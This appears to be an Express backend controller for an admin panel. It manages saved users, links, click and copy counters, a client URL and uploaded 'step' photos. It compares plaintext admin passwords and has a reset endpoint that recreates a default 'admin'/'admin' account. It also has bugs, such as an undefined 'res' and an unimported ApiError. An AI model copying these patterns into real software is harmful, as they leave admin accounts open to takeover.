const User = require("../models/userModel.js");
const Link = require("../models/linkModel.js");
const  Admin  = require("../models/adminModel.js");
const Data = require("../models/dataModel.js");
const { uploadOnCloudinary } = require("../cloudinary.js");
const Client = require("../models/clientDataModel.js");

const genAdminAccessAndRefreshToken = async (userId) => {
  try {
    const user = await Admin.findById(userId);

    if (!user) {
      return res.status(404).json({
        success: false,
        message: "Admin not found...!",
      });
    }

    const adminAccessToken = user.generateAccessToken();

    return { adminAccessToken };
  } catch (error) {
    return res.status(404).json({
      success: false,
      message: "Internal Server Error during token generation.",
    });
  }
};

const loginAdmin = async (req, res) => {
  const { admin, password } = req.body;
  try {
    if (!admin || !password) {
      return res.status(404).json({
        success: false,
        message: "Enter username and password......!",
      });
    }

    const user = await Admin.findOne({ username: admin });

    if (!user) {
      return res.status(404).json({
        success: false,
        message: "Admin not found...!",
      });
    }

    const isPasswordValid = user.password === password;
    if (!isPasswordValid) {
      return res.status(404).json({
        success: false,
        message: "Password no match...!",
      });
    }

    const { adminAccessToken } = await genAdminAccessAndRefreshToken(user._id);

    const loggedUser = await Admin.findById(user._id).select("-password");

    const options = {
      httpOnly: true,
      secure: true,
      sameSite: "none", // Allow cross-site
    };

    return res
      .status(200)
      .cookie("adminAccessToken", adminAccessToken, options)
      .json({
        success: true,
        message: "Logged",
        data: loggedUser,
      });
  } catch (error) {
    return res.status(error.statusCode || 500).json({
      status: error.statusCode,
      success: false,
      message: error.message,
    });
  }
};
const savedUsers = async (_req, res) => {
  try {
    const users = await User.find().sort({ createdAt: -1 });

    if (users) {
      return res.status(201).json({
        success: true,
        message: "Users retured..!",
        data: users,
      });
    }
    return res.status(404).json({
      success: false,
      message: "Users not found..!",
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: "Server error..!",
    });
  }
};
const addLink = async (req, res) => {
  const { link } = req.body;
  if (!link) {
    return res.status(404).json({
      success: false,
      message: "Input link..!",
    });
  }

  try {
    const exit = await Link.findOne({ link });
    if (exit) {
      return res.status(404).json({
        success: false,
        message: "Link already exist..!",
      });
    }
    const savedLink = await Link.create({
      link,
    });
    if (savedLink) {
      const links = await Link.find().sort({ createdAt: -1 });
      return res.status(201).json({
        success: true,
        message: "Link saved..!",
        data: links,
      });
    }
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: "Server error..!",
    });
  }
};
const getLinks = async (_req, res) => {
  try {
    const links = await Link.find().sort({ createdAt: -1 });

    if (links) {
      return res.status(201).json({
        success: true,
        message: "Links retured..!",
        data: links,
      });
    }
    return res.status(404).json({
      success: false,
      message: "Links not found..!",
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: "Server error..!",
    });
  }
};
const deleteLink = async (req, res) => {
  try {
    await Link.deleteMany();
    return res.status(201).json({
      success: true,
      message: "Link saved..!",
      data: [],
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: "Server error..!",
    });
  }
};
const copiedLinks = async (req, res) => {
  try {
    const data = await Data.findOne();
    if (data) {
      await Data.findByIdAndUpdate(
        data._id,
        {
          $inc: { copiedEmails: 1 },
        },
        { new: true }
      );
    } else {
      await Data.create({
        copiedEmails: 1,
      });
    }

    return res.status(201).json({
      success: true,
      message: "Copied..!",
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: "Server error..!",
    });
  }
};
const getData = async (req, res) => {
  try {
    const data = await Data.findOne();

    return res.status(201).json({
      success: true,
      message: "Copied..!",
      data: data,
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: "Server error..!",
    });
  }
};

const resetAdmin = async (req, res) => {
  try {
    await Admin.deleteMany();

    const admin = await Admin.create({
      name: "Admin",
      username: "admin",
      password: "admin",
    });
    return res.status(201).json({
      success: true,
      message: "Copied..!",
      data: admin,
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: error,
    });
  }
};
const updateName = async (req, res) => {
  const { name } = req.body;
  try {
    const admin = await Admin.findByIdAndUpdate(
      req.admin._id,
      { name },
      { new: true }
    );
    return res.status(201).json({
      success: true,
      message: "Updated...",
      data: admin,
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: error,
    });
  }
};
const updateUsername = async (req, res) => {
  const { username } = req.body;
  try {
    const admin = await Admin.findByIdAndUpdate(
      req.admin._id,
      { username },
      { new: true }
    );
    return res.status(201).json({
      success: true,
      message: "Updated...",
      data: admin,
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: error,
    });
  }
};
const updatePassword = async (req, res) => {
  const { password, oldpassword } = req.body;
  const { _id } = req.admin;

  try {
    const admin = await Admin.findById(_id);
    if (!admin) {
      return res.status(404).json({
        success: false,
        message: "Admin not found..!",
      });
    }

    if (admin.password !== oldpassword) {
      return res.status(404).json({
        success: false,
        message: "Old password does not match..!",
      });
    }

    await Admin.findByIdAndUpdate(_id, { password }, { new: true });
    return res.status(200).json({
      success: true,
      message: "Password updated successfully.",
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: "Server error..!",
    });
  }
};
const setClientUrl = async (req, res) => {
  const { url } = req.body;
  try {
    const data = await Data.findOne();

    if (data) {
      const updatedData = await Data.findByIdAndUpdate(
        data._id,
        {
          $set: { clientUrl: url },
        },
        { new: true }
      );
      return res.status(200).json({
        success: true,
        message: "Client URL updated successfully.",
        data: updatedData,
      });
    } else {
      const createdData = await Data.create({
        clientUrl: url,
      });
      return res.status(201).json({
        success: true,
        message: "Client URL set successfully.",
        data: createdData,
      });
    }
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: "Server error..!",
    });
  }
};
const setDevicecount = async (req, res) => {
  const { id } = req.params;
  if (id === "Mobile" || id === "Desktop") {
    try {
      await Data.findOneAndUpdate({}, { $inc: { [`${id.toLowerCase()}Clicks`]: 1 } });
      return res.status(200).json({
        success: true,
        message: "Page loaded successfully.",
      });
    } catch (error) {
      return res.status(500).json({
        success: false,
        message: "Server error..!",
      });
    }
  }
  return res.status(404).json({
    success: false,
    message: "Invalid id",
  });
};

const resetNotification = async (req, res) => {
  try {
    const data = await Data.findOne();
    if(!data){
      return res.status(404).json({
        success: false,
        message: "Data not found",
      })
    }
    await Data.findByIdAndUpdate(data._id, { $set: { notifications: 0 } });
    return res.status(200).json({
      success: true,
      message: "Notification reset successfully.",
    });
  } catch (error) {
    return res.status(404).json({
      success: false,
      message: "server error..!",
    });
  }
};
const resetAlert = async (req, res) => {
  try {
    const data = await Data.findOne();
    if(!data){
      return res.status(404).json({
        success: false,
        message: "Data not found",
      })
    }
    await Data.findByIdAndUpdate(data._id, { $set: { alert: false } });
    return res.status(200).json({
      success: true,
      message: "Alert reset successfully.",
    });
  } catch (error) {
    return res.status(404).json({
      success: false,
      message: "server error..!",
    });
  }
};
const updateStep1 = async (req, res) => {
  try {
    const photoPath = req.file?.path;

    if (!photoPath) {
      return res.status(400).json({
        success: false,
        message: "Photo not found",
      });
    }

    // Upload to Cloudinary
    const photoImg = await uploadOnCloudinary(
      photoPath,
      `Images`,
      "step1"
    );
    if (!photoImg) {
      throw new ApiError(400, "Photo saving failed");
    }
    // Update user avatar in the database
    const data = await Client.findOne()
    const user = await Client.findByIdAndUpdate(
      data?._id,
      { $set: { step1: photoImg.secure_url } },
      { new: true }
    );

    return res.status(200).json({
      success: true,
      message: "Photo updated",
      data: user,
    });
  } catch (error) {
    return res.status(error.statusCode || 500).json({
      success: false,
      message: error.message || "Internal Server Error",
    });
  }
};
const updateStep2 = async (req, res) => {
  try {
    const photoPath = req.file?.path;

    if (!photoPath) {
      return res.status(400).json({
        success: false,
        message: "Photo not found",
      });
    }

    // Upload to Cloudinary
    const photoImg = await uploadOnCloudinary(
      photoPath,
      `Images`,
      "step2"
    );
    if (!photoImg) {
      throw new ApiError(400, "Photo saving failed");
    }
    // Update user avatar in the database
    const data = await Client.findOne()
    const user = await Client.findByIdAndUpdate(
      data?._id,
      { $set: { step2: photoImg.secure_url } },
      { new: true }
    );

    return res.status(200).json({
      success: true,
      message: "Photo updated",
      data: user,
    });
  } catch (error) {
    return res.status(error.statusCode || 500).json({
      success: false,
      message: error.message || "Internal Server Error",
    });
  }
};
const updateStep3 = async (req, res) => {
  try {
    const photoPath = req.file?.path;

    if (!photoPath) {
      return res.status(400).json({
        success: false,
        message: "Photo not found",
      });
    }

    // Upload to Cloudinary
    const photoImg = await uploadOnCloudinary(
      photoPath,
      `Images`,
      "step3"
    );
    if (!photoImg) {
      throw new ApiError(400, "Photo saving failed");
    }
    // Update user avatar in the database
    const data = await Client.findOne()
    const user = await Client.findByIdAndUpdate(
      data?._id,
      { $set: { step3: photoImg.secure_url } },
      { new: true }
    );

    return res.status(200).json({
      success: true,
      message: "Photo updated",
      data: user,
    });
  } catch (error) {
    return res.status(error.statusCode || 500).json({
      success: false,
      message: error.message || "Internal Server Error",
    });
  }
};
const updateClientEmail = async (req, res) => {
  const { email } = req.body;
  try {
    if (!email) {
      return res.status(400).json({
        success: false,
        message: "Email not found",
      });
    };

    const data = await Client.findOne();
    const updatedData = await Client.findByIdAndUpdate(data?._id,{
      $set:{email}
    },{new: true});
    return res.status(200).json({
      success: true,
      message: "Email updated..",
      data: updatedData
    })
  } catch (error) {
    return res.status(error.statusCode || 500).json({
      success: false,
      message: error.message || "Internal Server Error",
    });
  }
};
module.exports = {
  setClientUrl,
  updateName,
  updatePassword,
  updateUsername,
  loginAdmin,
  resetAdmin,
  savedUsers,
  addLink,
  getLinks,
  deleteLink,
  copiedLinks,
  getData,
  setDevicecount,
  resetNotification,
  resetAlert,
  updateStep1,
  updateStep2,
  updateStep3,
  updateClientEmail
};